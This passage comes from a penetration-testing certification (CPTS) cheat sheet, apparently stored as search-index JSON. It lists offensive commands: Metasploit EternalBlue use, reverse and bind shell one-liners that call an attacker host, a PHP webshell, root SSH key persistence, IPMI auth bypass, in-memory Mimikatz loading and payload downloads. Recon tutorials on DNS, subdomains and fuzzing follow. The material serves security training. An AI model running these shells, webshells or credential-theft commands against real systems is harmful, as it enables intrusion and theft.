<code>curl 10.10.10.121/robots.txt</code> List potential directories in\u00a0<code>robots.txt</code> <code>ctrl+U</code> View page source (in Firefox) Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable Using Shells <code>nc -lvnp 1234</code> Start a\u00a0<code>nc</code>\u00a0listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code>\u00a0then\u00a0<code>stty raw -echo</code>\u00a0then\u00a0<code>fg</code>\u00a0then\u00a0<code>enter</code>\u00a0twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell Privilege Escalation <code>./linpeas.sh</code> Run\u00a0<code>linpeas</code>\u00a0script to enumerate remote server <code>sudo -l</code> List available\u00a0<code>sudo</code>\u00a0privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with\u00a0<code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to\u00a0<code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to\u00a0<code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh\u00a0root@10.10.10.10\u00a0-i key</code> SSH to the server with the generated private key Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with\u00a0<code>scp</code>\u00a0(requires SSH access) <code>base64 shell -w 0</code> Convert a file to\u00a0<code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from\u00a0<code>base64</code>\u00a0back to its orig <code>md5sum shell</code> Check the file's\u00a0<code>md5sum</code>\u00a0to ensure it converted correctly","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#infrastructure-based-enumeration","title":"Infrastructure-based Enumeration","text":"Command Description <code>curl -s https://crt.sh/\\?q\\=&lt;target-domain&gt;\\&amp;output\\=json \\| jq .</code> Certificate transparency. <code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code> Scan each IP address in a list using Shodan.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#host-based-enumeration","title":"Host-based Enumeration","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#ftp","title":"FTP","text":"Command Description <code>ftp &lt;FQDN/IP&gt;</code> Interact with the FTP service on the target. <code>nc -nv &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>telnet &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target. <code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code> Interact with the FTP service on the target using encrypted connection. <code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code> Download all available files on the target FTP server.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#smb","title":"SMB","text":"Command Description <code>smbclient -N -L //&lt;FQDN/IP&gt;</code> Null session authentication on SMB. <code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code> Connect to a specific SMB share. <code>rpcclient -U \"\" &lt;FQDN/IP&gt;</code> Interaction with the target using RPC. <code>samrdump.py &lt;FQDN/IP&gt;</code> Username enumeration using Impacket scripts. <code>smbmap -H &lt;FQDN/IP&gt;</code> Enumerating SMB shares. <code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code> Enumerating SMB shares using null session authentication. <code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code> SMB enumeration using enum4linux.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#nfs","title":"NFS","text":"Command Description <code>showmount -e &lt;FQDN/IP&gt;</code> Show available NFS shares. <code>mount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code> Mount the specific NFS share.umount ./target-NFS <code>umount ./target-NFS</code> Unmount the specific NFS share.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#dns","title":"DNS","text":"Command Description <code>dig ns &lt;domain.tld&gt; @&lt;nameserver&gt;</code> NS request to the specific nameserver. <code>dig any &lt;domain.tld&gt; @&lt;nameserver&gt;</code> ANY request to the specific nameserver. <code>dig axfr &lt;domain.tld&gt; @&lt;nameserver&gt;</code> AXFR request to the specific nameserver. <code>dnsenum --dnsserver &lt;nameserver&gt; --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld&gt;</code> Subdomain brute forcing.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#smtp","title":"SMTP","text":"Command Description <code>telnet &lt;FQDN/IP&gt; 25</code> sudo nmap $ip -sC -sV -p25 Enumerate SMTP service for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done Enumerate users","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#imappop3","title":"IMAP/POP3","text":"Command Description <code>openssl s_client -connect &lt;FQDN/IP&gt;:imaps</code> Connect to the IMAPS service. <code>openssl s_client -connect &lt;FQDN/IP&gt;:pop3s</code> Connect to the POP3s service. After connection is established, see the IMAP and POP3 commands: <pre><code>############\nIMAP commandCACCs\n############\n# User's login\na LOGIN username password\n\n# Lists all directories\na LIST \"\" *\n\n# Creates a mailbox with a specified name\na CREATE \"INBOX\" \n\n# Deletes a mailbox\na DELETE \"INBOX\" \n\n# Renames a mailbox\na RENAME \"ToRead\" \"Important\"\n\n# Returns a subset of names from the set of names that the User has declared as being active or subscribed\na LSUB \"\" *\n\n# Selects a mailbox so that messages in the mailbox can be accessed\na SELECT INBOX\n\n# Exits the selected mailbox\na UNSELECT INBOX\n\n# Retrieves data (parts of the message) associated with a message in the mailbox\na FETCH &lt;ID&gt; all\n# If you want to retrieve the body:\na FETCH &lt;ID&gt; BODY.PEEK[TEXT]\n\n# Removes all messages with the `Deleted` flag set\na CLOSE\n\n# Closes the connection with the IMAP server\na LOGOUT\n</code></pre> <pre><code>############\nPOP3 Commands\n############\n\n\n# Identifies the user\nUSER username\n\n# Authentication of the user using its password\nPASS password\n\n# Requests the number of saved emails from the server\nSTAT\n\n# Requests from the server the number and size of all emails\nLIST \n\n# Requests the server to deliver the requested email by ID\nRETR id\n\n# Requests the server to delete the requested email by ID\nDELE id\n\n# Requests the server to display the server capabilities\nCAPA\n\n# Requests the server to reset the transmitted information\nRSET\n\n# Closes the connection with the POP3 server\nQUIT\n</code></pre> Command Description sudo nmap $ip -sV -p110,143,993,995 -sC` Footprinting the service <code>curl -v -k 'imaps://&lt;FQDN/IP&gt;' --user &lt;user&gt;:&lt;password&gt;</code> Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made <p>After connection is established, see the IMAP and POP3 commands:</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#snmp","title":"SNMP","text":"Command Description <code>snmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code> Querying OIDs using snmpwalk. <code>onesixtyone -c community-strings.list &lt;FQDN/IP&gt;</code> Bruteforcing community strings of the SNMP service. <code>braa &lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</code> Bruteforcing SNMP service OIDs.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#sql","title":"SQL","text":"Command Description sudo nmap $ip -sV -sC -p3306 --script mysql* Footprinting the service sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip Run script for checking out empty passwords.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#mysql","title":"MySQL","text":"Command Description <code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;IP address&gt;</code> Connect to the MySQL server. There should\u00a0not\u00a0be a space between the '-p' flag, and the password. <code>show databases;</code> Show all databases. <code>use &lt;database&gt;;</code> Select one of the existing databases. <code>show tables;</code> Show all available tables in the selected database. <code>show columns from &lt;table&gt;;</code> Show all columns in the selected database. <code>select * from &lt;table&gt;;</code> Show everything in the desired table. <code>select * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";</code> Search for needed\u00a0<code>string</code>\u00a0in the desired table. ##### MSSQL Command Description <code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip</code> Enumerate <code>mssqlclient.py &lt;user&gt;@&lt;FQDN/IP&gt; -windows-auth</code> Log in to the MSSQL server using Windows authentication. <pre><code># Get Microsoft SQL server version\nselect @@version;\n\n# Get usernames\nselect user_name()\ngo \n\n# Get databases\nSELECT name FROM master.dbo.sysdatabases\ngo\n\n# Get current database\nSELECT DB_NAME()\ngo\n\n# Get a list of users in the domain\nSELECT name FROM master..syslogins\ngo\n\n# Get a list of users that are sysadmins\nSELECT name FROM master..syslogins WHERE sysadmin = 1\ngo\n\n# And to make sure: \nSELECT is_srvrolemember(\u2018sysadmin\u2019)\ngo\n# If your user is admin, it will return 1.\n\n# Read Local Files in MSSQL\nSELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#oracle-tns","title":"Oracle TNS","text":"Command Description <code>python3 ./odat.py all -s &lt;FQDN/IP&gt;</code> Perform a variety of scans to gather information about the Oracle database services and its components. <code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;FQDN/IP&gt;/&lt;db&gt;</code> Log in to the Oracle database. <code>python3 ./odat.py utlfile -s &lt;FQDN/IP&gt; -d &lt;db&gt; -U &lt;user&gt; -P &lt;pass&gt; --sysdba --putFile C:\\\\insert\\\\path file.txt ./file.txt</code> Upload a file with Oracle RDBMS.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#ipmi","title":"IPMI","text":"Command Description nmap -n-sU -p 623 $ip/24 Enumerate in a network range sudo nmap -sU --script ipmi* -p 623 $ip Run all nmap scripts related to ipmi protocol <code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code> IPMI version detection. <code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code> Dump IPMI hashes. Similar to the The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack apt-get install ipmitoolipmitool -I lanplus -C 0 -H  $ip -U root -P root user list The IPMI Authentication Bypass via Cipher 0 attackInstall ipmitool and use Cipher 0 to dump a list of users. With -C 0 any password is accepted apt-get install ipmitoolipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack Install ipmitool and change the password of root The IPMI Anonymous Authentication attack","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#linux-remote-management","title":"Linux Remote Management","text":"Command Description <code>ssh-audit.py &lt;FQDN/IP&gt;</code> Remote security audit against the target SSH service. <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using the SSH client. <code>ssh -i private.key &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using private key. <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt; -o PreferredAuthentications=password</code> Enforce password-based authentication.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#windows-remote-management","title":"Windows Remote Management","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#rdp","title":"RDP","text":"Command Description nmap -Pn -sV -p3389 --script rdp-*  $ip Footprinting RDP git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check./rdp-sec-check.pl $ip A Perl script named\u00a0rdp-sec-check.pl\u00a0has also been developed by\u00a0Cisco CX Security Labs\u00a0that can unauthentically identify the security settings of RDP servers based on the handshakes. <code>xfreerdp /u:&lt;user&gt; /p:\"&lt;password&gt;\" /v:&lt;FQDN/IP&gt;</code> Log in to the RDP server from Linux. <code>wmiexec.py &lt;user&gt;:\"&lt;password&gt;\"@&lt;FQDN/IP&gt; \"&lt;system command&gt;\"</code> Execute command using the WMI service.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#winrm","title":"WinRM","text":"Command Description nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n Footprinting WinRM <code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code> Log in to the WinRM server.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#wmi","title":"WMI","text":"Command Description <code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code> Log in to the WinRM server. <code>wmiexec.py &lt;user&gt;:\"&lt;password&gt;\"@&lt;FQDN/IP&gt; \"&lt;system command&gt;\"</code> Execute command using the WMI service.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#information-gathering","title":"Information gathering","text":"<p>Web reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a target before formulating a plan of action. In the digital realm, this translates to accumulating information about a website or web application to identify potential vulnerabilities, security misconfigurations, and valuable assets.</p> <p>The primary goals of web reconnaissance revolve around gaining a comprehensive understanding of the target's digital footprint. This includes:</p> <ul> <li><code>Identifying Assets</code>: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.</li> <li><code>Uncovering Hidden Information</code>: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.</li> <li><code>Analyzing the Attack Surface</code>: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.</li> <li><code>Gathering Intelligence</code>: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.</li> </ul> <p>Web reconnaissance can be conducted using either active or passive techniques, each with its own advantages and drawbacks:</p> Type Description Risk of Detection Examples Active Reconnaissance Involves directly interacting with the target system, such as sending probes or requests. Higher Port scanning, vulnerability scanning, network mapping Passive Reconnaissance Gathers information without directly interacting with the target, relying on publicly available data. Lower Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#whois","title":"WHOIS","text":"<p>WHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.</p> <p>For example, if you wanted to find out who owns the domain\u00a0<code>example.com</code>, you could run the following command in your terminal:</p> <p>Code:\u00a0bash</p> <pre><code>whois example.com\n</code></pre> <p>This would return a wealth of information, including the registrar, registration, and expiration dates, nameservers, and contact information for the domain owner.</p> <p>However, it's important to note that WHOIS data can be inaccurate or intentionally obscured, so it's always wise to verify the information from multiple sources. Privacy services can also mask the true owner of a domain, making it more difficult to obtain accurate information through WHOIS.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#dns_1","title":"DNS","text":"<p>The Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into the numerical IP addresses computers use to communicate. Like GPS converting a destination's name into coordinates, DNS ensures your browser reaches the correct website by matching its name with its IP address. This eliminates memorizing complex numerical addresses, making web navigation seamless and efficient.</p> <p>The\u00a0<code>dig</code>\u00a0command allows you to query DNS servers directly, retrieving specific information about domain names. For instance, if you want to find the IP address associated with\u00a0<code>example.com</code>, you can execute the following command:</p> <p>Code:\u00a0bash</p> <pre><code>dig example.com A\n</code></pre> <p>This command instructs\u00a0<code>dig</code>\u00a0to query the DNS for the\u00a0<code>A</code>\u00a0record (which maps a hostname to an IPv4 address) of\u00a0<code>example.com</code>. The output will typically include the requested IP address, along with additional details about the query and response. By mastering the\u00a0<code>dig</code>\u00a0command and understanding the various DNS record types, you gain the ability to extract valuable information about a target's infrastructure and online presence.</p> <p>DNS servers store various types of records, each serving a specific purpose:</p> Record Type Description A Maps a hostname to an IPv4 address. AAAA Maps a hostname to an IPv6 address. CNAME Creates an alias for a hostname, pointing it to another hostname. MX Specifies mail servers responsible for handling email for the domain. NS Delegates a DNS zone to a specific authoritative name server. TXT Stores arbitrary text information. SOA Contains administrative information about a DNS zone.","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#subdomains","title":"Subdomains","text":"<p>Subdomains are essentially extensions of a primary domain name, often used to organize different sections or services within a website. For example, a company might use\u00a0<code>mail.example.com</code>\u00a0for their email server or\u00a0<code>blog.example.com</code>\u00a0for their blog.</p> <p>From a reconnaissance perspective, subdomains are incredibly valuable. They can expose additional attack surfaces, reveal hidden services, and provide clues about the internal structure of a target's network. Subdomains might host development servers, staging environments, or even forgotten applications that haven't been properly secured.</p> <p>The process of discovering subdomains is known as subdomain enumeration. There are two main approaches to subdomain enumeration:</p> Approach Description Examples <code>Active Enumeration</code> Directly interacts with the target's DNS servers or utilizes tools to probe for subdomains. Brute-forcing, DNS zone transfers <code>Passive Enumeration</code> Collects information about subdomains without directly interacting with the target, relying on public sources. Certificate Transparency (CT) logs, search engine queries <p><code>Active enumeration</code>\u00a0can be more thorough but carries a higher risk of detection. Conversely,\u00a0<code>passive enumeration</code>\u00a0is stealthier but may not uncover all subdomains. Combining both techniques can significantly increase the likelihood of discovering a comprehensive list of subdomains associated with your target, expanding your understanding of their online presence and potential vulnerabilities.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#subdomain-brute-forcing","title":"Subdomain Brute-Forcing","text":"<p>Subdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.</p> <p>One of the most versatile tools for subdomain brute-forcing is\u00a0<code>dnsenum</code>. This powerful command-line tool combines various DNS enumeration techniques, including dictionary-based brute-forcing, to uncover subdomains associated with your target.</p> <p>To use\u00a0<code>dnsenum</code>\u00a0for subdomain brute-forcing, you'll typically provide it with the target domain and a wordlist containing potential subdomain names. The tool will then systematically query the DNS server for each potential subdomain and report any that exist.</p> <p>For example, the following command would attempt to brute-force subdomains of\u00a0<code>example.com</code>\u00a0using a wordlist named\u00a0<code>subdomains.txt</code>:</p> <p>Code:\u00a0bash</p> <pre><code>dnsenum example.com -f subdomains.txt\n</code></pre>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#zone-transfers","title":"Zone Transfers","text":"<p>DNS zone transfers, also known as AXFR (Asynchronous Full Transfer) requests, offer a potential goldmine of information for web reconnaissance. A zone transfer is a mechanism for replicating DNS data across servers. When a zone transfer is successful, it provides a complete copy of the DNS zone file, which contains a wealth of details about the target domain.</p> <p>This zone file lists all the domain's subdomains, their associated IP addresses, mail server configurations, and other DNS records. This is akin to obtaining a blueprint of the target's DNS infrastructure for a reconnaissance expert.</p> <p>To attempt a zone transfer, you can use the\u00a0<code>dig</code>\u00a0command with the\u00a0<code>axfr</code>\u00a0(full zone transfer) option. For example, to request a zone transfer from the DNS server\u00a0<code>ns1.example.com</code>\u00a0for the domain\u00a0<code>example.com</code>, you would execute:</p> <p>Code:\u00a0bash</p> <pre><code>dig @ns1.example.com example.com axfr\n</code></pre> <p>However, zone transfers are not always permitted. Many DNS servers are configured to restrict zone transfers to authorized secondary servers only. Misconfigured servers, though, may allow zone transfers from any source, inadvertently exposing sensitive information.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#virtual-hosts","title":"Virtual Hosts","text":"<p>Virtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.</p> <p>Since multiple websites share the same IP address, simply scanning the IP won't reveal all the hosted sites. You need a tool that can test different hostnames against the IP address to see which ones respond.</p> <p>Gobuster is a versatile tool that can be used for various types of brute-forcing, including virtual host discovery. Its\u00a0<code>vhost</code>\u00a0mode is designed to enumerate virtual hosts by sending requests to the target IP address with different hostnames. If a virtual host is configured for a specific hostname, Gobuster will receive a response from the web server.</p> <p>To use Gobuster to brute-force virtual hosts, you'll need a wordlist containing potential hostnames. Here's an example command:</p> <p>Code:\u00a0bash</p> <pre><code>gobuster vhost -u http://192.0.2.1 -w hostnames.txt\n</code></pre> <p>In this example,\u00a0<code>-u</code>\u00a0specifies the target IP address, and\u00a0<code>-w</code>\u00a0specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#certificate-transparency-ct-logs","title":"Certificate Transparency (CT) Logs","text":"<p>Certificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.</p> <p>The\u00a0<code>crt.sh</code>\u00a0website provides a searchable interface for CT logs. To efficiently extract subdomains using\u00a0<code>crt.sh</code>\u00a0within your terminal, you can use a command like this:</p> <p>Code:\u00a0bash</p> <pre><code>curl -s \"https://crt.sh/?q=%25.example.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n</code></pre> <p>This command fetches JSON-formatted data from\u00a0<code>crt.sh</code>\u00a0for\u00a0<code>example.com</code>\u00a0(the\u00a0<code>%</code>\u00a0is a wildcard), extracts domain names using\u00a0<code>jq</code>, removes any wildcard prefixes (<code>*.</code>) with\u00a0<code>sed</code>, and finally sorts and deduplicates the results.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#web-crawling","title":"Web Crawling","text":"<p>Web crawling is the automated exploration of a website's structure. A web crawler, or spider, systematically navigates through web pages by following links, mimicking a user's browsing behavior. This process maps out the site's architecture and gathers valuable information embedded within the pages.</p> <p>A crucial file that guides web crawlers is\u00a0<code>robots.txt</code>. This file resides in a website's root directory and dictates which areas are off-limits for crawlers. Analyzing\u00a0<code>robots.txt</code>\u00a0can reveal hidden directories or sensitive areas that the website owner doesn't want to be indexed by search engines.</p> <p><code>Scrapy</code>\u00a0is a powerful and efficient Python framework for large-scale web crawling and scraping projects. It provides a structured approach to defining crawling rules, extracting data, and handling various output formats.</p> <p>Here's a basic Scrapy spider example to extract links from\u00a0<code>example.com</code>:</p> <p>Code:\u00a0python</p> <pre><code>import scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n</code></pre> <p>After running the Scrapy spider, you'll have a file containing scraped data (e.g.,\u00a0<code>example_data.json</code>). You can analyze these results using standard command-line tools. For instance, to extract all links:</p> <p>Code:\u00a0bash</p> <pre><code>jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n</code></pre> <p>This command uses\u00a0<code>jq</code>\u00a0to extract links,\u00a0<code>awk</code>\u00a0to isolate file extensions,\u00a0<code>sort</code>\u00a0to order them, and\u00a0<code>uniq -c</code>\u00a0to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#search-engine-discovery","title":"Search Engine Discovery","text":"<p>Leveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.</p> <p>By employing advanced search operators and specialized queries known as \"Google Dorks,\" you can pinpoint specific information buried within search results. Here's a table of some useful search operators for web reconnaissance:</p> Operator Description Example <code>site:</code> Restricts search results to a specific website. <code>site:example.com \"password reset\"</code> <code>inurl:</code> Searches for a specific term in the URL of a page. <code>inurl:admin login</code> <code>filetype:</code> Limits results to files of a specific type. <code>filetype:pdf \"confidential report\"</code> <code>intitle:</code> Searches for a term within the title of a page. <code>intitle:\"index of\" /backup</code> <code>cache:</code> Shows the cached version of a webpage. <code>cache:example.com</code> <code>\"search term\"</code> Searches for the exact phrase within quotation marks. <code>\"internal error\" site:example.com</code> <code>OR</code> Combines multiple search terms. <code>inurl:admin OR inurl:login</code> <code>-</code> Excludes specific terms from search results. <code>inurl:admin -intext:wordpress</code> <p>By creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#web-archives","title":"Web Archives","text":"<p>Web archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.</p> <p>The Wayback Machine, a project by the Internet Archive, has been archiving the web for over two decades, capturing billions of web pages from across the globe. This massive historical data collection can be an invaluable resource for security researchers and investigators.</p> Feature Description Use Case in Reconnaissance <code>Historical Snapshots</code> View past versions of websites, including pages, content, and design changes. Identify past website content or functionality that is no longer available. <code>Hidden Directories</code> Explore directories and files that may have been removed or hidden from the current version of the website. Discover sensitive information or backups that were inadvertently left accessible in previous versions. <code>Content Changes</code> Track changes in website content, including text, images, and links. Identify patterns in content updates and assess the evolution of a website's security posture. <p>By leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.</p>","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#file-transferr-techniques","title":"File Transferr techniques","text":"Command Description <code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code> Download a file with PowerShell <code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code> Execute a file in memory using PowerShell <code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code> Upload a file with PowerShell <code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe</code> Download a file using Bitsadmin <code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code> Download a file using Certutil <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code> Download a file using Wget <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code> Download a file using cURL <code>php -r '$file = file_get_contents(\"https://&lt;snip&gt;/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code> Download a file using PHP <code>scp C:\\Temp\\bloodhound.zip\u00a0user@10.10.10.150:/tmp/bloodhound.zip</code> Upload a file using SCP <code>scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe</code> Download a file using SCP <code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"</code> Invoke-WebRequest using a Chrome User Agent","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#fuzzing-with-ffuf","title":"Fuzzing with Ffuf","text":"Command Description <code>ffuf -h</code> ffuf help <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing <code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> 